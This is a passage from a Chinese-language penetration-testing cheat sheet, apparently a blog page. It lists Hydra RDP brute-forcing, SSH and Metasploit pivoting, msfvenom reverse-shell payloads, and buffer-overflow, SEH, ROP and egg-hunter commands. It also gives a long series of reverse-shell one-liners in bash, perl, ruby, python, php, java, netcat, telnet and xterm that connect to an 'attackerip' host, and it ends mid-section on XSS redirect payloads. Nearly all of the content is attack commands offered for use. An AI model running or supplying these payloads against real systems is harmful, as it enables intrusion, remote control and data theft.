+<div class="hljs code-wrapper"><pre><code class="hljs bash">hydra <span class="hljs-_">-l</span> admin -P /root/Desktop/passwords -S X.X.X.X rdp
+</code></pre></div>
+<h3><span id="-windows-2">挂载远程 Windows 共享文件夹</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs ruby">smbmount /<span class="hljs-regexp">/X.X.X.X/c</span>$ /mnt/remote/ -o username=user,password=pass,rw
+</code></pre></div>
+<h3><span id="kali-exploit">Kali 下编译 Exploit</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">gcc</span> <span class="hljs-selector-tag">-m32</span> <span class="hljs-selector-tag">-o</span> <span class="hljs-selector-tag">output32</span> <span class="hljs-selector-tag">hello</span><span class="hljs-selector-class">.c</span> (32 位)
+<span class="hljs-selector-tag">gcc</span> <span class="hljs-selector-tag">-m64</span> <span class="hljs-selector-tag">-o</span> <span class="hljs-selector-tag">output</span> <span class="hljs-selector-tag">hello</span><span class="hljs-selector-class">.c</span> (64 位)
+</code></pre></div>
+<h3><span id="kali-windows-exploit">Kali 下编译 Windows Exploit</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs cs">wget -O mingw-<span class="hljs-keyword">get</span>-setup.exe http:<span class="hljs-comment">//sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/download</span>
+wine mingw-<span class="hljs-keyword">get</span>-setup.exe
+<span class="hljs-keyword">select</span> mingw32-<span class="hljs-keyword">base</span>
+cd /root/.wine/drive_c/windows
+wget http:<span class="hljs-comment">//gojhonny.com/misc/mingw_bin.zip &amp;&amp; unzip mingw_bin.zip</span>
+cd /root/.wine/drive_c/MinGW/bin
+wine gcc -o ability.exe /tmp/exploit.c -lwsock32
+wine ability.exe
+</code></pre></div>
+<h3><span id="nasm">NASM 命令</span></h3>
+<p>注：NASM 全称 The Netwide Assembler，是一款基于80×86和x86-64平台的汇编语言编译程序，其设计初衷是为了实现编译器程序跨平台和模块化的特性。</p>
+<div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">nasm</span> <span class="hljs-selector-tag">-f</span> <span class="hljs-selector-tag">bin</span> <span class="hljs-selector-tag">-o</span> <span class="hljs-selector-tag">payload</span><span class="hljs-selector-class">.bin</span> <span class="hljs-selector-tag">payload</span><span class="hljs-selector-class">.asm</span>
+<span class="hljs-selector-tag">nasm</span> <span class="hljs-selector-tag">-f</span> <span class="hljs-selector-tag">elf</span> <span class="hljs-selector-tag">payload</span><span class="hljs-selector-class">.asm</span>; <span class="hljs-selector-tag">ld</span> <span class="hljs-selector-tag">-o</span> <span class="hljs-selector-tag">payload</span> <span class="hljs-selector-tag">payload</span><span class="hljs-selector-class">.o</span>; <span class="hljs-selector-tag">objdump</span> <span class="hljs-selector-tag">-d</span> <span class="hljs-selector-tag">payload</span>
+</code></pre></div>
+<h3><span id="ssh">SSH 穿透</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">ssh</span> <span class="hljs-selector-tag">-D</span> 127<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span><span class="hljs-selector-pseudo">:1080</span> <span class="hljs-selector-tag">-p</span> 22 <span class="hljs-selector-tag">user</span>@<span class="hljs-keyword">IP</span>
+Add socks4 <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-number">1080</span> in /etc/proxychains.conf
+proxychains commands target
+</code></pre></div>
+<h3><span id="ssh-2">SSH 穿透从一个网络到另一个网络</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">ssh</span> -D <span class="hljs-number">127.0.0.1:1080</span> -p <span class="hljs-number">22</span> user1<span class="hljs-variable">@IP1</span>
+Add socks4 <span class="hljs-number">127.0.0.1</span> <span class="hljs-number">1080</span> in /etc/proxychains.conf
+proxychains ssh -D <span class="hljs-number">127.0.0.1:1081</span> -p <span class="hljs-number">22</span> user1<span class="hljs-variable">@IP2</span>
+Add socks4 <span class="hljs-number">127.0.0.1</span> <span class="hljs-number">1081</span> in /etc/proxychains.conf
+proxychains commands target
+</code></pre></div>
+<h3><span id="-metasploit">使用 metasploit 进行穿透</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">route</span> add X.X.X.X <span class="hljs-number">255.255.255.0</span> <span class="hljs-number">1</span>
+use auxiliary/server/socks4a
+run
+proxychains msfcli windows/* PAYLOAD=windows/meterpreter/reverse_tcp LHOST=IP LPORT=<span class="hljs-number">443</span> RHOST=IP E
+
+<p>或者</p>
+<p><span class="hljs-comment"># <a href="https://www.offensive-security.com/metasploit-unleashed/pivoting/" target="_blank" rel="noopener">https://www.offensive-security.com/metasploit-unleashed/pivoting/</a></span><br>meterpreter &gt; ipconfig<br>IP Address  : <span class="hljs-number">10.1.13.3</span><br>meterpreter &gt; run autoroute -s <span class="hljs-number">10.1.13.0</span>/<span class="hljs-number">24</span><br>meterpreter &gt; run autoroute -p<br><span class="hljs-number">10.1.13.0</span>          <span class="hljs-number">255.255.255.0</span>      Session <span class="hljs-number">1</span><br>meterpreter &gt; Ctrl+Z<br>msf auxiliary(tcp) &gt; use exploit/windows/smb/psexec<br>msf exploit(psexec) &gt; set RHOST <span class="hljs-number">10.1.13.2</span><br>msf exploit(psexec) &gt; exploit<br>meterpreter &gt; ipconfig<br>IP Address  : <span class="hljs-number">10.1.13.2</span><br></code></pre></div></p>
+<h3><span id="-csv-exploit-db">基于 CSV 文件查询 Exploit-DB</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs perl">git clone https:<span class="hljs-regexp">//github</span>.com/offensive-security/exploit-database.git
+cd exploit-database
+./searchsploit –u
+./searchsploit apache <span class="hljs-number">2.2</span>
+./searchsploit <span class="hljs-string">"Linux Kernel"</span>
+
+<p>cat files.csv | <span class="hljs-keyword">grep</span> -i linux | <span class="hljs-keyword">grep</span> -i kernel | <span class="hljs-keyword">grep</span> -i <span class="hljs-keyword">local</span> | <span class="hljs-keyword">grep</span> -v dos | uni<span class="hljs-string">q | grep 2.6 |</span> egrep <span class="hljs-string">“&lt;|&lt;=”</span> | <span class="hljs-keyword">sort</span> -k3<br></code></pre></div></p>
+<h3><span id="msf-payloads">MSF Payloads</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs dts">msfvenom -p windows<span class="hljs-meta-keyword">/meterpreter/</span>reverse_tcp LHOST=<span class="hljs-params">&lt;IP Address&gt;</span> X &gt; system.exe
+msfvenom -p php<span class="hljs-meta-keyword">/meterpreter/</span>reverse_tcp LHOST=<span class="hljs-params">&lt;IP Address&gt;</span> LPORT=<span class="hljs-number">443</span> R &gt; exploit.php
+msfvenom -p windows<span class="hljs-meta-keyword">/meterpreter/</span>reverse_tcp LHOST=<span class="hljs-params">&lt;IP Address&gt;</span> LPORT=<span class="hljs-number">443</span> -e -a x86 --platform win -f asp -o file.asp
+msfvenom -p windows<span class="hljs-meta-keyword">/meterpreter/</span>reverse_tcp LHOST=<span class="hljs-params">&lt;IP Address&gt;</span> LPORT=<span class="hljs-number">443</span> -e x86/shikata_ga_nai -b <span class="hljs-string">"\x00"</span> -a x86 --platform win -f c
+</code></pre></div>
+<h3><span id="msf-linux-meterpreter-shell">MSF 生成在 Linux 下反弹的 Meterpreter Shell</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs bash">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 <span class="hljs-_">-e</span> <span class="hljs-_">-f</span> elf <span class="hljs-_">-a</span> x86 --platform linux -o shell
+</code></pre></div>
+<h3><span id="msf-shell-c-shellcode">MSF 生成反弹 Shell (C Shellcode)</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs bash">msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -b <span class="hljs-string">"\x00\x0a\x0d"</span> <span class="hljs-_">-a</span> x86 --platform win <span class="hljs-_">-f</span> c
+</code></pre></div>
+<h3><span id="msf-python-shell">MSF 生成反弹 Python Shell</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">msfvenom</span> -p cmd/unix/reverse_python LHOST=<span class="hljs-number">127.0.0.1</span> LPORT=<span class="hljs-number">443</span> -o shell.py
+</code></pre></div>
+<h3><span id="msf-asp-shell">MSF 生成反弹 ASP Shell</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs dts">msfvenom -p windows<span class="hljs-meta-keyword">/meterpreter/</span>reverse_tcp LHOST=<span class="hljs-params">&lt;Your IP Address&gt;</span> LPORT=<span class="hljs-params">&lt;Your Port to Connect On&gt;</span> -f asp -a x86 --platform win -o shell.asp
+</code></pre></div>
+<h3><span id="msf-bash-shell">MSF 生成反弹 Bash Shell</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs dts">msfvenom -p cmd<span class="hljs-meta-keyword">/unix/</span>reverse_bash LHOST=<span class="hljs-params">&lt;Your IP Address&gt;</span> LPORT=<span class="hljs-params">&lt;Your Port to Connect On&gt;</span> -o shell.sh
+</code></pre></div>
+<h3><span id="msf-php-shell">MSF 生成反弹 PHP Shell</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs xml">msfvenom -p php/meterpreter_reverse_tcp LHOST=<span class="hljs-tag">&lt;<span class="hljs-name">Your</span> <span class="hljs-attr">IP</span> <span class="hljs-attr">Address</span>&gt;</span> LPORT=<span class="hljs-tag">&lt;<span class="hljs-name">Your</span> <span class="hljs-attr">Port</span> <span class="hljs-attr">to</span> <span class="hljs-attr">Connect</span> <span class="hljs-attr">On</span>&gt;</span> -o shell.php
+add <span class="php"><span class="hljs-meta">&lt;?php</span> at the beginning
+perl -i~ <span class="hljs-number">-0777</span>pe<span class="hljs-string">'s/^/&lt;?php \n/'</span> shell.php
+</span></code></pre></div>
+<h3><span id="msf-win-shell">MSF 生成反弹 Win Shell</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs dts">msfvenom -p windows<span class="hljs-meta-keyword">/meterpreter/</span>reverse_tcp LHOST=<span class="hljs-params">&lt;Your IP Address&gt;</span> LPORT=<span class="hljs-params">&lt;Your Port to Connect On&gt;</span> -f exe -a x86 --platform win -o shell.exe
+</code></pre></div>
+<h3><span id="linux">Linux 常用安全命令</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 使用 uid 查找对应的程序</span>
+find / -uid 0 -perm -4000
+
+<p><span class="hljs-comment"># 查找哪里拥有写权限</span><br>find / -perm -o=w</p>
+<p><span class="hljs-comment"># 查找名称中包含点和空格的文件</span><br>find / -name <span class="hljs-string">“ “</span> -print<br>find / -name <span class="hljs-string">“..”</span> -print<br>find / -name <span class="hljs-string">“. “</span> -print<br>find / -name <span class="hljs-string">“ “</span> -print</p>
+<p><span class="hljs-comment"># 查找不属于任何人的文件</span><br>find / -nouser</p>
+<p><span class="hljs-comment"># 查找未链接的文件</span><br>lsof +L1</p>
+<p><span class="hljs-comment"># 获取进程打开端口的信息</span><br>lsof -i</p>
+<p><span class="hljs-comment"># 看看 ARP 表中是否有奇怪的东西</span><br>arp <span class="hljs-_">-a</span></p>
+<p><span class="hljs-comment"># 查看所有账户</span><br>getent passwd</p>
+<p><span class="hljs-comment"># 查看所有用户组</span><br>getent group</p>
+<p><span class="hljs-comment"># 列举所有用户的 crontabs</span><br><span class="hljs-keyword">for</span> user <span class="hljs-keyword">in</span> $(getent passwd|cut <span class="hljs-_">-f</span>1 <span class="hljs-_">-d</span>:); <span class="hljs-keyword">do</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">“### Crontabs for <span class="hljs-variable">$user</span> ####”</span>; crontab -u <span class="hljs-variable">$user</span> <span class="hljs-_">-l</span>; <span class="hljs-keyword">done</span></p>
+<p><span class="hljs-comment"># 生成随机密码</span><br>cat /dev/urandom| tr -dc ‘a-zA-Z0-9-<em>!@<span class="hljs-comment">#$%^&amp;*()</em>+{}|:&lt;&gt;?=’|fold -w 12| head -n 4</span></p>
+<p><span class="hljs-comment"># 查找所有不可修改的文件</span><br>find . | xargs -I file lsattr <span class="hljs-_">-a</span> file 2&gt;/dev/null | grep ‘^….i’</p>
+<p><span class="hljs-comment"># 使文件不可修改</span><br>chattr -i file<br></code></pre></div></p>
+<h3><span id="windows">Windows 缓冲区溢出利用命令</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs sql">msfvenom -p windows/shell_bind_tcp -a x86 <span class="hljs-comment">--platform win -b "\x00" -f c</span>
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=443 -a x86 <span class="hljs-comment">--platform win -e x86/shikata_ga_nai -b "\x00" -f c</span>
+
+<p>COMMONLY USED BAD CHARACTERS:<br>\x00\x0a\x0d\x20                              For http request<br>\x00\x0a\x0d\x20\x1a\x2c\x2e\3a\x5c           Ending with (0\n\r_)</p>
+<h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令:"></a>常用命令:</h1><p>pattern <span class="hljs-keyword">create</span><br>pattern <span class="hljs-keyword">offset</span> (EIP Address)<br>pattern <span class="hljs-keyword">offset</span> (ESP Address)<br><span class="hljs-keyword">add</span> garbage upto EIP <span class="hljs-keyword">value</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">add</span> (JMP ESP address) <span class="hljs-keyword">in</span> EIP . (ESP = shellcode )</p>
+<p>!pvefindaddr pattern_create <span class="hljs-number">5000</span><br>!pvefindaddr suggest<br>!pvefindaddr modules<br>!pvefindaddr nosafeseh</p>
+<p>!mona config -<span class="hljs-keyword">set</span> workingfolder <span class="hljs-keyword">C</span>:\Mona%<span class="hljs-keyword">p</span><br>!mona config -<span class="hljs-keyword">get</span> workingfolder<br>!mona <span class="hljs-keyword">mod</span><br>!mona bytearray -b <span class="hljs-string">“\x00\x0a”</span><br>!mona pc <span class="hljs-number">5000</span><br>!mona po EIP<br>!mona suggest<br></code></pre></div></p>
+<h3><span id="seh-8211">SEH – 结构化异常处理</span></h3>
+<p>注：SEH(“Structured Exception Handling”)，即结构化异常处理，是 windows 操作系统提供给程序设计者的强有力的处理程序错误或异常的武器。</p>
+<div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta"># https:<span class="hljs-comment">//en.wikipedia.org/wiki/Microsoft-specific_exception_handling_mechanisms#SEH</span></span>
+<span class="hljs-meta"># http:<span class="hljs-comment">//baike.baidu.com/view/243131.htm</span></span>
+!mona suggest
+!mona nosafeseh
+nseh=<span class="hljs-string">"\xeb\x06\x90\x90"</span> (next seh chain)
+iseh= !pvefindaddr p1 -n -o -i (POP POP RETRUN or POPr32,POPr32,RETN)
+</code></pre></div>
+<h3><span id="rop-dep">ROP (DEP)</span></h3>
+<p>注：ROP(“Return-Oriented Programming”)是计算机安全漏洞利用技术，该技术允许攻击者在安全防御的情况下执行代码，如不可执行的内存和代码签名。</p>
+<p>DEP(“Data Execution Prevention”)是一套软硬件技术，在内存上严格将代码和数据进行区分，防止数据当做代码执行。</p>
+<div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta"># https:<span class="hljs-comment">//en.wikipedia.org/wiki/Return-oriented_programming</span></span>
+<span class="hljs-meta"># https:<span class="hljs-comment">//zh.wikipedia.org/wiki/%E8%BF%94%E5%9B%9E%E5%AF%BC%E5%90%91%E7%BC%96%E7%A8%8B</span></span>
+<span class="hljs-meta"># https:<span class="hljs-comment">//en.wikipedia.org/wiki/Data_Execution_Prevention</span></span>
+<span class="hljs-meta"># http:<span class="hljs-comment">//baike.baidu.com/item/DEP/7694630</span></span>
+!mona modules
+!mona ropfunc -m *.dll -cpb <span class="hljs-string">"\x00\x09\x0a"</span>
+!mona rop -m *.dll -cpb <span class="hljs-string">"\x00\x09\x0a"</span> (<span class="hljs-keyword">auto</span> suggest)
+</code></pre></div>
+<h3><span id="aslr-8211">ASLR – 地址空间格局随机化</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta"># https:<span class="hljs-comment">//en.wikipedia.org/wiki/Address_space_layout_randomization</span></span>
+<span class="hljs-meta"># http:<span class="hljs-comment">//baike.baidu.com/view/3862310.htm</span></span>
+!mona noaslr
+</code></pre></div>
+<h3><span id="egg-hunter">寻蛋(EGG Hunter)技术</span></h3>
+<p>Egg hunting这种技术可以被归为“分级shellcode”，它主要可以支持你用一小段特制的shellcode来找到你的实际的（更大的）shellcode（我们的‘鸡蛋‘），原理就是通过在内存中搜索我们的最终shellcode。换句话说，一段短代码先执行，然后再去寻找真正的shellcode并执行。– 参考自<a href="http://www.pediy.com/kssd/pediy11/120392.html" target="_blank" rel="noopener">看雪论坛</a>，更多详情可以查阅我在代码注释中增加的链接。</p>
+<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/</span>
+<span class="hljs-comment"># http://www.pediy.com/kssd/pediy12/116190/831793/45248.pdf</span>
+<span class="hljs-comment"># http://www.fuzzysecurity.com/tutorials/expDev/4.html</span>
+!mona jmp -r esp
+!mona egg -t lxxl
+\xeb\xc4 (jump backward <span class="hljs-number">-60</span>)
+buff=lxxllxxl+shell
+!mona egg -t <span class="hljs-string">'w00t'</span>
+</code></pre></div>
+<h3><span id="gdb-debugger">GDB Debugger 常用命令</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 设置断点</span>
+<span class="hljs-built_in">break</span> *_start
+
+<p><span class="hljs-comment"># 执行下一个命令</span><br>next<br>step<br>n<br>s</p>
+<p><span class="hljs-comment"># 继续执行</span><br><span class="hljs-built_in">continue</span><br>c</p>
+<p><span class="hljs-comment"># 数据</span><br>checking <span class="hljs-string">‘REGISTERS’</span> and <span class="hljs-string">‘MEMORY’</span></p>
+<p><span class="hljs-comment"># 显示寄存器的值: (Decimal,Binary,Hex)</span><br><span class="hljs-built_in">print</span> /d –&gt; Decimal<br><span class="hljs-built_in">print</span> /t –&gt; Binary<br><span class="hljs-built_in">print</span> /x –&gt; Hex<br>O/P :<br>(gdb) <span class="hljs-built_in">print</span> /d <span class="hljs-variable">$eax</span><br><span class="hljs-variable">$17</span> = 13<br>(gdb) <span class="hljs-built_in">print</span> /t <span class="hljs-variable">$eax</span><br><span class="hljs-variable">$18</span> = 1101<br>(gdb) <span class="hljs-built_in">print</span> /x <span class="hljs-variable">$eax</span><br><span class="hljs-variable">$19</span> = 0xd<br>(gdb)</p>
+<p><span class="hljs-comment"># 显示特定内存地址的值</span><br><span class="hljs-built_in">command</span> : x/nyz (Examine)<br>n –&gt; Number of fields to display ==&gt;<br>y –&gt; Format <span class="hljs-keyword">for</span> output ==&gt; c (character) , d (decimal) , x (Hexadecimal)<br>z –&gt; Size of field to be displayed ==&gt; b (byte) , h (halfword), w (word 32 Bit)<br></code></pre></div></p>
+<h3><span id="bash-shell">BASH 反弹 Shell</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs dts">bash -i &gt;&amp; <span class="hljs-meta-keyword">/dev/</span>tcp/X.X.X.X/<span class="hljs-number">443</span> <span class="hljs-number">0</span>&gt;<span class="hljs-variable">&amp;1</span>
+
+<p>exec <span class="hljs-meta-keyword">/bin/</span>bash <span class="hljs-number">0</span><span class="hljs-variable">&amp;0</span> <span class="hljs-number">2</span>&gt;<span class="hljs-variable">&amp;0</span><br>exec <span class="hljs-meta-keyword">/bin/</span>bash <span class="hljs-number">0</span><span class="hljs-variable">&amp;0</span> <span class="hljs-number">2</span>&gt;<span class="hljs-variable">&amp;0</span></p>
+<p><span class="hljs-number">0</span><span class="hljs-params">&lt;<span class="hljs-variable">&amp;196</span>;exec <span class="hljs-number">196</span>&lt;&gt;</span><span class="hljs-meta-keyword">/dev/</span>tcp<span class="hljs-meta-keyword">/attackerip/</span><span class="hljs-number">4444</span>; sh <span class="hljs-params">&lt;<span class="hljs-variable">&amp;196</span> &gt;</span><span class="hljs-variable">&amp;196</span> <span class="hljs-number">2</span>&gt;<span class="hljs-variable">&amp;196</span></p>
+<p><span class="hljs-number">0</span><span class="hljs-params">&lt;<span class="hljs-variable">&amp;196</span>;exec <span class="hljs-number">196</span>&lt;&gt;</span><span class="hljs-meta-keyword">/dev/</span>tcp<span class="hljs-meta-keyword">/attackerip/</span><span class="hljs-number">4444</span>; sh <span class="hljs-params">&lt;<span class="hljs-variable">&amp;196</span> &gt;</span><span class="hljs-variable">&amp;196</span> <span class="hljs-number">2</span>&gt;<span class="hljs-variable">&amp;196</span></p>
+<p>exec <span class="hljs-number">5</span><span class="hljs-params">&lt;&gt;</span><span class="hljs-meta-keyword">/dev/</span>tcp<span class="hljs-meta-keyword">/attackerip/</span><span class="hljs-number">4444</span> cat <span class="hljs-params">&lt;<span class="hljs-variable">&amp;5</span> | while read line; do $line <span class="hljs-number">2</span>&gt;</span><span class="hljs-variable">&amp;5</span> &gt;<span class="hljs-variable">&amp;5</span>; done <span class="hljs-meta"># or: while read line 0&lt;&amp;5; do $line 2&gt;&amp;5 &gt;&amp;5; done</span><br>exec <span class="hljs-number">5</span><span class="hljs-params">&lt;&gt;</span><span class="hljs-meta-keyword">/dev/</span>tcp<span class="hljs-meta-keyword">/attackerip/</span><span class="hljs-number">4444</span></p>
+<p>cat <span class="hljs-params">&lt;<span class="hljs-variable">&amp;5</span> | while read line; do $line <span class="hljs-number">2</span>&gt;</span><span class="hljs-variable">&amp;5</span> &gt;<span class="hljs-variable">&amp;5</span>; done <span class="hljs-meta"># or:</span><br>while read line <span class="hljs-number">0</span><span class="hljs-params">&lt;<span class="hljs-variable">&amp;5</span>; do $line <span class="hljs-number">2</span>&gt;</span><span class="hljs-variable">&amp;5</span> &gt;<span class="hljs-variable">&amp;5</span>; done</p>
+<p><span class="hljs-meta-keyword">/bin/</span>bash -i &gt; <span class="hljs-meta-keyword">/dev/</span>tcp<span class="hljs-meta-keyword">/attackerip/</span><span class="hljs-number">8080</span> <span class="hljs-number">0</span><span class="hljs-params">&lt;<span class="hljs-variable">&amp;1</span> <span class="hljs-number">2</span>&gt;</span><span class="hljs-variable">&amp;1</span><br><span class="hljs-meta-keyword">/bin/</span>bash -i &gt; <span class="hljs-meta-keyword">/dev/</span>tcp/X.X.X.X/<span class="hljs-number">443</span> <span class="hljs-number">0</span><span class="hljs-params">&lt;<span class="hljs-variable">&amp;1</span> <span class="hljs-number">2</span>&gt;</span><span class="hljs-variable">&amp;1</span><br></code></pre></div></p>
+<h3><span id="perl-shell">PERL 反弹 Shell</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">perl</span> -MIO -e <span class="hljs-string">'<span class="hljs-variable">$p</span>=fork;exit,if(<span class="hljs-variable">$p</span>);<span class="hljs-variable">$c</span>=new IO::Socket::INET(PeerAddr,"attackerip:443");STDIN-&gt;fdopen(<span class="hljs-variable">$c</span>,r);$~-&gt;fdopen(<span class="hljs-variable">$c</span>,w);system<span class="hljs-variable">$_</span> while&lt;&gt;;'</span>
+
+<p><span class="hljs-comment"># Win 平台</span><br>perl -MIO -e <span class="hljs-string">‘<span class="hljs-variable">$c</span>=new IO::Socket::INET(PeerAddr,”attackerip:4444”);STDIN-&gt;fdopen(<span class="hljs-variable">$c</span>,r);$~-&gt;fdopen(<span class="hljs-variable">$c</span>,w);system<span class="hljs-variable">$_</span> while&lt;&gt;;’</span><br>perl -e <span class="hljs-string">‘use Socket;<span class="hljs-variable">$i</span>=”10.0.0.1”;<span class="hljs-variable">$p</span>=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in(<span class="hljs-variable">$p</span>,inet_aton(<span class="hljs-variable">$i</span>)))){open(STDIN,”&gt;&amp;S”);open(STDOUT,”&gt;&amp;S”);open(STDERR,”&gt;&amp;S”);exec(“/bin/sh -i”);};’<br></span></code></pre></div></p>
+<h3><span id="ruby-shell">RUBY 反弹 Shell</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">ruby</span> -rsocket -e 'exit if fork;c=TCPSocket.new(<span class="hljs-string">"attackerip"</span>,<span class="hljs-string">"443"</span>);while(cmd=c.gets);IO.popen(cmd,<span class="hljs-string">"r"</span>){|io|c.print io.read}end'
+
+<p><span class="hljs-comment"># Win 平台</span><br><span class="hljs-attribute">ruby</span> -rsocket -e ‘c=TCPSocket.new(<span class="hljs-string">“attackerip”</span>,<span class="hljs-string">“443”</span>);while(cmd=c.gets);IO.popen(cmd,<span class="hljs-string">“r”</span>){|io|c.print io.read}end’<br><span class="hljs-attribute">ruby</span> -rsocket -e ‘f=TCPSocket.open(<span class="hljs-string">“attackerip”</span>,<span class="hljs-string">“443”</span>).to_i;exec sprintf(<span class="hljs-string">“/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d”</span>,f,f,f)’<br></code></pre></div></p>
+<h3><span id="python-shell-2">PYTHON 反弹 Shell</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">python</span> -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="hljs-string">"attackerip"</span>,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([<span class="hljs-string">"/bin/sh"</span>,<span class="hljs-string">"-i"</span>]);'
+</code></pre></div>
+<h3><span id="php-shell">PHP 反弹 Shell</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">php</span> -r <span class="hljs-string">'<span class="hljs-variable">$sock</span>=fsockopen("attackerip",443);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span>
+</code></pre></div>
+<h3><span id="java-shell">JAVA 反弹 Shell</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs python">r = Runtime.getRuntime()
+p = r.exec([<span class="hljs-string">"/bin/bash"</span>,<span class="hljs-string">"-c"</span>,<span class="hljs-string">"exec 5&lt;&gt;/dev/tcp/attackerip/443;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"</span>] <span class="hljs-keyword">as</span> String[])
+p.waitFor()
+</code></pre></div>
+<h3><span id="netcat-shell">NETCAT 反弹 Shell</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs dts">nc -e <span class="hljs-meta-keyword">/bin/</span>sh attackerip <span class="hljs-number">4444</span>
+nc -e <span class="hljs-meta-keyword">/bin/</span>sh <span class="hljs-number">192.168</span><span class="hljs-number">.37</span><span class="hljs-number">.10</span> <span class="hljs-number">443</span>
+
+<p><span class="hljs-meta"># 如果 -e 参数被禁用，可以尝试以下命令</span><br><span class="hljs-meta"># mknod backpipe p &amp;&amp; nc attackerip 443 0&lt;backpipe | /bin/bash 1&gt;backpipe</span><br><span class="hljs-meta-keyword">/bin/</span>sh | nc attackerip <span class="hljs-number">443</span><br>rm -f <span class="hljs-meta-keyword">/tmp/</span>p; mknod <span class="hljs-meta-keyword">/tmp/</span>p p &amp;&amp; nc attackerip <span class="hljs-number">4443</span> <span class="hljs-number">0</span><span class="hljs-meta-keyword">/tmp/</span></p>
+<p><span class="hljs-meta"># 如果你安装错了 netcat 的版本，请尝试以下命令</span><br>rm <span class="hljs-meta-keyword">/tmp/</span>f;mkfifo <span class="hljs-meta-keyword">/tmp/</span>f;cat <span class="hljs-meta-keyword">/tmp/</span>f|<span class="hljs-meta-keyword">/bin/</span>sh -i <span class="hljs-number">2</span>&gt;<span class="hljs-variable">&amp;1</span>|nc attackerip &gt;<span class="hljs-meta-keyword">/tmp/</span>f<br></code></pre></div></p>
+<h3><span id="telnet-shell">TELNET 反弹 Shell</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs dts"><span class="hljs-meta"># 如果 netcat 不可用或者 /dev/tcp</span>
+mknod backpipe p &amp;&amp; telnet attackerip <span class="hljs-number">443</span> <span class="hljs-number">0</span><span class="hljs-params">&lt;backpipe | /bin/bash <span class="hljs-number">1</span>&gt;</span>backpipe
+</code></pre></div>
+<h3><span id="xterm-shell">XTERM 反弹 Shell</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs dts"><span class="hljs-meta"># http:<span class="hljs-comment">//baike.baidu.com/view/418628.htm</span></span>
+<span class="hljs-meta"># 开启 X 服务器 (:1 – 监听 TCP 端口 6001)</span>
+apt-get install xnest
+Xnest :<span class="hljs-number">1</span>
+
+<p><span class="hljs-meta"># 记得授权来自目标 IP 的连接</span><br>xterm -display <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">1</span></p>
+<p><span class="hljs-meta"># 授权访问</span><br>xhost +targetip</p>
+<p><span class="hljs-meta"># 在目标机器上连接回我们的 X 服务器</span><br>xterm -display attackerip:<span class="hljs-number">1</span><br><span class="hljs-meta-keyword">/usr/</span>openwin<span class="hljs-meta-keyword">/bin/</span>xterm -display attackerip:<span class="hljs-number">1</span><br>or<br>$ DISPLAY=attackerip:<span class="hljs-number">0</span> xterm<br></code></pre></div></p>
+<h3><span id="xss">XSS 备忘录</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs php">https:<span class="hljs-comment">//www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</span>
+(<span class="hljs-string">"&lt; iframes &gt; src=http://IP:PORT &lt;/ iframes &gt;"</span>)
+
+<p>&lt;script&gt;document.location=http:<span class="hljs-comment">//IP:PORT&lt;/script&gt;</span></p>
